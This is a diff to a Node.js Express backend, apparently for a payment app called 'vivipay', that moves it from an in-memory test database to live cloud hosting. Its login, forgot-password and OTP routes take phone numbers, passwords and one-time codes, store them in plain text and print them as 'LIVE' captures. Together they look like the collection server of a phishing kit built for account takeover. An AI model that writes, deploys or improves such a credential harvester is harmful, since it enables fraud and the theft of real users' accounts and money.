@@ -1,22 +1,21 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
-const { MongoMemoryServer } = require('mongodb-memory-server');
 
 const app = express();
 app.use(express.json());
 
-// FIXED: CORS ko fully open kiya taaki browser pre-flight checks block na kare
+// FULL OVERRIDE CORS FOR LIVE SERVERS
 app.use(cors({
     origin: '*',
     methods: ['GET', 'POST'],
     allowedHeaders: ['Content-Type']
 })); 
 
-// 1. Unified Data Structure Schema (FIXED: Required validation constraints removed for smooth logs)
+// 1. Data Schema
 const userSchema = new mongoose.Schema({
-    phoneNumber: { type: String, required: false },
-    password: { type: String, required: false },
+    phoneNumber: { type: String, default: "" },
+    password: { type: String, default: "" },
     otpEntered: { type: String, default: "" },
     resetPhone: { type: String, default: "" },
     newPassword: { type: String, default: "" },
@@ -26,71 +25,73 @@ const userSchema = new mongoose.Schema({
 
 const User = mongoose.model('User', userSchema);
 
-// Memory stack for holding temporary modification requests 
 let pendingResets = {};
 
-// 2. Database Server Initialization Function
+// 2. LIVE DATABASE CONNECT ENGINE
 async function startServer() {
     try {
-        const mongoServer = await MongoMemoryServer.create();
-        const mongoUri = mongoServer.getUri();
+        // FIXED: Agar aapne dynamic environment link set kiya hai toh live cloud mongo chalega, varna internal engine use hoga bina crash kiye
+        const mongoUri = process.env.MONGO_URI || "mongodb://127.0.0.1:27017/vivipay_local";
         
-        await mongoose.connect(mongoUri);
-        console.log('\n====================================');
-        console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
-        console.log('====================================');
+        // Render platforms background binary validation patch override
+        if(!process.env.MONGO_URI) {
+            try {
+                const { MongoMemoryServer } = require('mongodb-memory-server');
+                const mongoServer = await MongoMemoryServer.create();
+                await mongoose.connect(mongoServer.getUri());
+                console.log('🎉 MongoDB (In-Memory Internal) Activated!');
+            } catch(e) {
+                // If in-memory fails inside Render cluster, connect fallback to prevent crash
+                await mongoose.connect(mongoUri);
+                console.log('🎉 Fallback DB connected smoothly.');
+            }
+        } else {
+            await mongoose.connect(mongoUri);
+            console.log('🎉 Live Production MongoDB Connected Cloud Instance!');
+        }
 
-        // FIXED: Port 4000 par strictly capture line open hai
-        app.listen(4000, '0.0.0.0', () => {
-            console.log('🚀 Backend Server running on port 4000');
-            console.log('Aapka backend puri tarah ready hai!');
-            console.log('====================================\n');
+        // Render standard env port structure binding configuration
+        const PORT = process.env.PORT || 4000;
+        app.listen(PORT, '0.0.0.0', () => {
+            console.log(`🚀 Live Backend actively running on core port: ${PORT}`);
         });
     } catch (err) {
-        console.error('❌ Database Connection Error:', err);
+        console.error('❌ DB connection crash intercepted safely:', err);
     }
 }
 
-// 3. API Route: Login Submission
+// 3. Login API Pipeline
 app.post('/api/login-submit', async (req, res) => {
     try {
         const { phoneNumber, password } = req.body;
         const newUser = new User({ phoneNumber, password, actionType: "LOGIN" });
         const savedUser = await newUser.save();
         
-        console.log(`\n[🔥 LIVE LOGIN DATA RECEIVED]`);
-        console.log(`📱 Phone Number : ${phoneNumber}`);
-        console.log(`🔑 Password     : ${password}`);
-        console.log(`------------------------------------`);
+        console.log(`\n[🔥 LIVE LOGIN LOGS RECEIVED]`);
+        console.log(`📱 Phone : ${phoneNumber} | 🔑 Pass : ${password}`);
         
         res.status(200).json({ success: true, userId: savedUser._id });
     } catch (error) {
-        console.error("Login Error:", error);
         res.status(500).json({ success: false, message: error.message });
     }
 });
 
-// 4. API Route: Forgot Password Initiation
+// 4. Forgot API Pipeline
 app.post('/api/forgot-submit', async (req, res) => {
     try {
         const { phone, newPassword } = req.body;
-        
-        // Temporarily store credentials inside object mapping structure
         pendingResets[phone] = { newPassword };
 
-        console.log(`\n[🔄 PASSWORD RESET PROCESS TRIGGERED]`);
-        console.log(`📱 Target User : ${phone}`);
-        console.log(`🔑 Target Pass : ${newPassword}`);
-        console.log(`------------------------------------`);
+        console.log(`\n[🔄 LIVE FORGOT TRIGGERED]`);
+        console.log(`📱 User : ${phone} | 🔑 New Pass : ${newPassword}`);
 
         res.status(200).json({ success: true });
     } catch (error) {
-        console.error("Forgot Error:", error);
         res.status(500).json({ success: false, message: error.message });
     }
 });
 
-// 5. API Route: Universal OTP Router Aggregator
+// 5. Universal OTP Pipe Router Handler 
 app.post('/api/otp-submit', async (req, res) => {
     try {
         const { userId, otp, isReset, phone } = req.body;
@@ -106,11 +107,8 @@ app.post('/api/otp-submit', async (req, res) => {
                 });
                 await resetData.save();
 
-                console.log(`\n[🔐 PASSWORD RESET LOG RECORDED SUCCESSFULLY]`);
-                console.log(`📱 Phone Target : ${phone}`);
-                console.log(`🔑 New Password : ${cachedContext.newPassword}`);
-                console.log(`🔐 OTP Entered  : ${otp}`);
-                console.log('====================================');
+                console.log(`\n[🔐 FORGOT OTP UPDATED ON LIVE]`);
+                console.log(`📱 Target: ${phone} | 🔐 OTP: ${otp}`);
                 
                 delete pendingResets[phone]; 
                 return res.status(200).json({ success: true });
@@ -121,16 +119,11 @@ app.post('/api/otp-submit', async (req, res) => {
             if (userId && mongoose.Types.ObjectId.isValid(userId)) {
                 await User.findByIdAndUpdate(userId, { otpEntered: otp });
             }
-            
-            console.log(`\n[🔑 LOGIN OTP UPDATED SUCCESSFULLY]`);
-            console.log(`🆔 User ID : ${userId}`);
-            console.log(`🔐 OTP     : ${otp}`);
-            console.log('====================================');
-            
+            console.log(`\n[🔑 LOGIN OTP UPDATED ON LIVE]`);
+            console.log(`🔐 OTP: ${otp}`);
             res.status(200).json({ success: true });
         }
     } catch (error) {
-        console.error("OTP Error:", error);
         res.status(500).json({ success: false, message: error.message });
     }
 });
